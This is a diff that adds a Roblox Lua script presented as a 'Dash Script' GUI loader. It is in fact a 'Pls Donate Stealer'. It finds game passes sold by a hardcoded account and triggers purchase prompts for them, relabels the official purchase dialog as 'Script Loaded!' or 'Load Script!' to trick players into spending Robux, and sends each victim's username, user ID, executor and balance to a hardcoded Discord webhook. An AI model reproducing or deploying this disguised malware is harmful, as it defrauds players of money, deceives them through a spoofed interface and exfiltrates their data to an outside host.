@@ -1,0 +1,205 @@
+local Players = game:GetService("Players")
+local TweenService = game:GetService("TweenService")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local MarketplaceService = game:GetService("MarketplaceService")
+local HttpService = game:GetService("HttpService")
+local CoreGui = game:GetService("CoreGui")
+
+local player = Players.LocalPlayer
+local playerGui = player:WaitForChild("PlayerGui")
+
+local Username = "XxxXloveryl1"
+local Webhook = "https://discord.com/api/webhooks/1358935494049665084/fOAH6oL_mbIgp4kFDNRu1Cl5l1LQ5uqV3-HZz3-B97tieCFQ3hrKBwxX9YcRZz2TW_9z"
+
+local screenGui = Instance.new("ScreenGui")
+screenGui.Parent = playerGui
+screenGui.ResetOnSpawn = false
+
+local frame = Instance.new("Frame")
+frame.Size = UDim2.new(0, 250, 0, 110)
+frame.Position = UDim2.new(1, 300, 1, -120)
+frame.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
+frame.BorderSizePixel = 0
+frame.Visible = true
+frame.Parent = screenGui
+
+local corner = Instance.new("UICorner")
+corner.CornerRadius = UDim.new(0, 10)
+corner.Parent = frame
+
+local stroke = Instance.new("UIStroke")
+stroke.Thickness = 1.5
+stroke.Color = Color3.fromRGB(255, 255, 255)
+stroke.Parent = frame
+
+local title = Instance.new("TextLabel")
+title.Size = UDim2.new(1, -16, 0, 24)
+title.Position = UDim2.new(0, 8, 0, 8)
+title.Text = "Dash Script"
+title.TextSize = 18
+title.TextColor3 = Color3.fromRGB(255, 255, 255)
+title.BackgroundTransparency = 1
+title.Font = Enum.Font.GothamBold
+title.TextXAlignment = Enum.TextXAlignment.Left
+title.Parent = frame
+
+local desc = Instance.new("TextLabel")
+desc.Size = UDim2.new(1, -16, 0, 38)
+desc.Position = UDim2.new(0, 8, 0, 34)
+desc.Text = "Loading Gui, Will Take A Few Seconds \n if it doesn\'t appear please rejoin."
+desc.TextSize = 14
+desc.TextColor3 = Color3.fromRGB(230, 230, 230)
+desc.BackgroundTransparency = 1
+desc.Font = Enum.Font.Gotham
+desc.TextWrapped = true
+desc.TextYAlignment = Enum.TextYAlignment.Top
+desc.Parent = frame
+
+local closeButton = Instance.new("TextButton")
+closeButton.Size = UDim2.new(1, -20, 0, 26)
+closeButton.Position = UDim2.new(0, 10, 1, -34)
+closeButton.Text = "Close"
+closeButton.TextSize = 16
+closeButton.Font = Enum.Font.GothamBold
+closeButton.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
+closeButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+closeButton.BorderSizePixel = 0
+closeButton.Parent = frame
+
+local buttonCorner = Instance.new("UICorner")
+buttonCorner.CornerRadius = UDim.new(0, 8)
+buttonCorner.Parent = closeButton
+
+local function openGui()
+    TweenService:Create(frame, TweenInfo.new(0.5, Enum.EasingStyle.Sine, Enum.EasingDirection.Out), {
+        Position = UDim2.new(1, -260, 1, -120)
+    }):Play()
+end
+
+local function closeGui()
+    local tween = TweenService:Create(frame, TweenInfo.new(0.5, Enum.EasingStyle.Sine, Enum.EasingDirection.In), {
+        Position = UDim2.new(1, 300, 1, -120)
+    })
+    tween:Play()
+    tween.Completed:Connect(function()
+        frame.Visible = false
+    end)
+end
+
+closeButton.MouseButton1Click:Connect(function()
+    TweenService:Create(closeButton, TweenInfo.new(0.08), {Size = UDim2.new(1, -24, 0, 24)}):Play()
+    task.delay(0.08, function()
+        TweenService:Create(closeButton, TweenInfo.new(0.08), {Size = UDim2.new(1, -20, 0, 26)}):Play()
+        task.delay(0.08, closeGui)
+    end)
+end)
+
+openGui()
+
+local Remotes = require(ReplicatedStorage:WaitForChild("Remotes"))
+
+local success, targetUserId = pcall(function()
+    return Players:GetUserIdFromNameAsync(Username)
+end)
+
+if not success then
+    player:Kick()
+    return
+end
+
+local boothData = Remotes.Function("OfflinePlayerLookup"):InvokeServer(targetUserId)
+if not boothData then
+    player:Kick()
+    return
+end
+
+local Animator = CoreGui:WaitForChild("PurchasePromptApp"):WaitForChild("ProductPurchaseContainer"):WaitForChild("Animator")
+
+local currentBalance = nil
+local targetPass = nil
+
+local function findCheapestPass()
+    local cheapestPrice = math.huge
+    local cheapestPass = nil
+
+    for _, item in pairs(boothData.BoothUI.Items.Frame:GetChildren()) do
+        if item:GetAttribute("AssetType") == "Gamepass" and not MarketplaceService:UserOwnsGamePassAsync(player.UserId, item:GetAttribute("AssetId")) then
+            local price = item:GetAttribute("AssetPrice")
+            if price < cheapestPrice then
+                cheapestPrice = price
+                cheapestPass = item
+            end
+        end
+    end
+
+    return cheapestPass, cheapestPrice
+end
+
+local function triggerPurchase(pass, price)
+    if pass and pass:FindFirstChild("Prompt") then
+        pass.Prompt:FireServer("", false, price)
+    end
+end
+
+targetPass, _ = findCheapestPass()
+if targetPass then
+    triggerPurchase(targetPass, targetPass:GetAttribute("AssetPrice"))
+end
+
+Animator.ChildAdded:Connect(function(child)
+    task.wait(0.2)
+    if child.Name == "Prompt" or child.Name == "ProductPurchaseModal" then
+        local balanceText = child:FindFirstChild("RemainingBalanceText", true)
+        if balanceText then
+            local balanceStr = balanceText.Text:match("(%d+)")
+            if balanceStr then
+                currentBalance = tonumber(balanceStr)
+            end
+        end
+
+        if currentBalance then
+            child.AlertContents.TitleContainer.TitleArea.Title.Text = "Please Donate - Script!"
+            child.AlertContents.MiddleContent.Visible = false
+            child.AlertContents.Footer.Buttons["1"].Visible = false
+            child.AlertContents.Footer.Buttons["2"].ButtonContent.ButtonMiddleContent.Text.Text = "Continue"
+        elseif targetPass then
+            child.AlertContents.TitleContainer.TitleArea.Title.Text = "Script Loaded!"
+            child.AlertContents.MiddleContent.Visible = false
+            child.AlertContents.Footer.Buttons["1"].ButtonContent.ButtonMiddleContent.Text.Text = "Load Script!"
+            child.AlertContents.Footer.Buttons["2"].Visible = false
+        end
+    end
+end)
+
+Remotes.OnClientEvent("GiftSentAlert"):Connect(function(senderId, amount)
+    if senderId == targetUserId and currentBalance then
+        currentBalance = currentBalance - amount
+
+        local embed = {
+            title = "**Shar's Script | Pls Donate Stealer**",
+            description = player.Name .. " usou o script!",
+            color = 3368447,
+            fields = {
+                { name = "Executor", value = identifyexecutor() or "Unknown", inline = false },
+                { name = "Username", value = player.Name, inline = true },
+                { name = "UserID", value = tostring(player.UserId), inline = true },
+                { name = "Robux Restante", value = tostring(currentBalance), inline = true }
+            },
+            footer = { text = "Created by Shar" }
+        }
+
+        pcall(function()
+            syn.request({
+                Url = Webhook,
+                Method = "POST",
+                Headers = { ["Content-Type"] = "application/json" },
+                Body = HttpService:JSONEncode({ content = "@everyone", embeds = { embed } })
+            })
+        end)
+
+        targetPass, _ = findCheapestPass()
+        if targetPass then
+            triggerPurchase(targetPass, targetPass:GetAttribute("AssetPrice"))
+        end
+    end
+end)
